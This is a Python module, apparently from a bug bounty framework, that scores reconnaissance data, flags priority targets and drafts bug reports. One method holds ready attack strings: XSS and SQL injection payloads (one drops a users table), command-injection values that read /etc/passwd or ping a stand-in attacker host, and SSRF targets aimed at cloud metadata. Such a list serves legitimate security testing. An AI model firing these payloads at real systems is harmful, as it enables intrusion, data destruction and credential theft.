#!/usr/bin/env python3
"""
🤖 AI Integration Module
Simple integration for AI-powered analysis in the bug bounty framework
"""

import json
import os
from typing import Dict, List, Any
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class SimpleAIIntegration:
    """Simple AI integration for basic analysis"""
    
    def __init__(self):
        self.analysis_results = []
        self.bug_reports = []
    
    def analyze_recon_data(self, recon_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze reconnaissance data and provide insights"""
        try:
            analysis = {
                'target': recon_data.get('domain', 'unknown'),
                'timestamp': datetime.now().isoformat(),
                'risk_score': self._calculate_risk_score(recon_data),
                'findings': self._extract_findings(recon_data),
                'suggestions': self._generate_suggestions(recon_data),
                'priority_targets': self._identify_priority_targets(recon_data)
            }
            
            self.analysis_results.append(analysis)
            return analysis
            
        except Exception as e:
            logger.error(f"Analysis failed: {e}")
            return self._get_fallback_analysis()
    
    def _calculate_risk_score(self, recon_data: Dict[str, Any]) -> float:
        """Calculate risk score based on reconnaissance data"""
        score = 0.0
        
        # Subdomain count
        subdomains = len(recon_data.get('subdomains', []))
        score += min(subdomains * 0.1, 2.0)
        
        # Vulnerability count
        vulnerabilities = len(recon_data.get('vulnerabilities', []))
        score += min(vulnerabilities * 0.5, 5.0)
        
        # Technology diversity
        technologies = len(recon_data.get('technologies', {}))
        score += min(technologies * 0.2, 2.0)
        
        # Open ports
        port_scan = recon_data.get('port_scan', {})
        open_ports = sum(len(ports) for ports in port_scan.values())
        score += min(open_ports * 0.1, 1.0)
        
        return min(score, 10.0)
    
    def _extract_findings(self, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Extract key findings from reconnaissance data"""
        findings = []
        
        # Subdomain findings
        subdomains = recon_data.get('subdomains', [])
        if subdomains:
            findings.append({
                'type': 'subdomains',
                'description': f'Discovered {len(subdomains)} subdomains',
                'count': len(subdomains),
                'confidence': 0.9
            })
        
        # Vulnerability findings
        vulnerabilities = recon_data.get('vulnerabilities', [])
        if vulnerabilities:
            findings.append({
                'type': 'vulnerabilities',
                'description': f'Found {len(vulnerabilities)} potential vulnerabilities',
                'count': len(vulnerabilities),
                'confidence': 0.8
            })
        
        # Technology findings
        technologies = recon_data.get('technologies', {})
        if technologies:
            findings.append({
                'type': 'technologies',
                'description': f'Identified {len(technologies)} technologies',
                'technologies': list(technologies.keys()),
                'confidence': 0.9
            })
        
        return findings
    
    def _generate_suggestions(self, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate attack suggestions based on reconnaissance data"""
        suggestions = []
        
        # XSS suggestions
        if any('xss' in str(v).lower() for v in recon_data.get('vulnerabilities', [])):
            suggestions.append({
                'type': 'xss',
                'description': 'Test for Cross-Site Scripting vulnerabilities',
                'targets': ['all_forms', 'search_parameters'],
                'payloads': ['<script>alert(1)</script>', 'javascript:alert(1)']
            })
        
        # SQL Injection suggestions
        if any('sql' in str(v).lower() for v in recon_data.get('vulnerabilities', [])):
            suggestions.append({
                'type': 'sqli',
                'description': 'Test for SQL Injection vulnerabilities',
                'targets': ['login_forms', 'search_parameters'],
                'payloads': ["' OR 1=1--", "' UNION SELECT NULL--"]
            })
        
        # Default suggestions
        if not suggestions:
            suggestions.append({
                'type': 'manual_testing',
                'description': 'Perform manual security testing',
                'targets': ['all_endpoints'],
                'payloads': ['standard_payloads']
            })
        
        return suggestions
    
    def _identify_priority_targets(self, recon_data: Dict[str, Any]) -> List[str]:
        """Identify high-priority targets for testing"""
        priority_targets = []
        
        # Check for admin subdomains
        subdomains = recon_data.get('subdomains', [])
        for subdomain in subdomains:
            if any(keyword in subdomain.lower() for keyword in ['admin', 'api', 'auth', 'login']):
                priority_targets.append(subdomain)
        
        # Check for vulnerable technologies
        technologies = recon_data.get('technologies', {})
        for tech, version in technologies.items():
            if any(keyword in tech.lower() for keyword in ['wordpress', 'phpmyadmin', 'jenkins']):
                priority_targets.append(f"{tech} ({version})")
        
        return priority_targets[:5]  # Limit to top 5
    
    def _get_fallback_analysis(self) -> Dict[str, Any]:
        """Get fallback analysis when processing fails"""
        return {
            'target': 'unknown',
            'timestamp': datetime.now().isoformat(),
            'risk_score': 5.0,
            'findings': [{'type': 'general', 'description': 'Basic analysis completed'}],
            'suggestions': [{'type': 'manual', 'description': 'Perform manual testing'}],
            'priority_targets': []
        }
    
    def generate_custom_payloads(self, analysis_result: Dict[str, Any]) -> List[str]:
        """Generate custom payloads based on analysis"""
        payloads = []
        
        # XSS payloads
        payloads.extend([
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>'
        ])
        
        # SQL Injection payloads
        payloads.extend([
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR '1'='1",
            "admin'--"
        ])
        
        # Command Injection payloads
        payloads.extend([
            '; ls -la',
            '| whoami',
            '`id`',
            '$(cat /etc/passwd)',
            '; ping -c 1 attacker.com'
        ])
        
        # SSRF payloads
        payloads.extend([
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'dict://localhost:11211/stat'
        ])
        
        return payloads[:10]  # Return first 10 payloads
    
    def generate_bug_report(self, vulnerability_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate a basic bug report"""
        report = {
            'title': vulnerability_data.get('title', 'Vulnerability Report'),
            'description': vulnerability_data.get('description', 'A security vulnerability was discovered'),
            'severity': vulnerability_data.get('severity', 'medium'),
            'impact': vulnerability_data.get('impact', 'Potential security risk'),
            'steps_to_reproduce': vulnerability_data.get('steps', ['Step 1: Identify the vulnerability']),
            'proof_of_concept': vulnerability_data.get('poc', 'Manual verification required'),
            'recommendations': ['Implement proper input validation', 'Use parameterized queries', 'Enable security headers'],
            'timestamp': datetime.now().isoformat()
        }
        
        self.bug_reports.append(report)
        return report
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get AI integration statistics"""
        return {
            'total_analyses': len(self.analysis_results),
            'total_reports': len(self.bug_reports),
            'last_analysis': self.analysis_results[-1]['timestamp'] if self.analysis_results else None,
            'average_risk_score': sum(r['risk_score'] for r in self.analysis_results) / len(self.analysis_results) if self.analysis_results else 0.0
        }

# Global instance
ai_integration = SimpleAIIntegration()

def get_ai_integration() -> SimpleAIIntegration:
    """Get the global AI integration instance"""
    return ai_integration 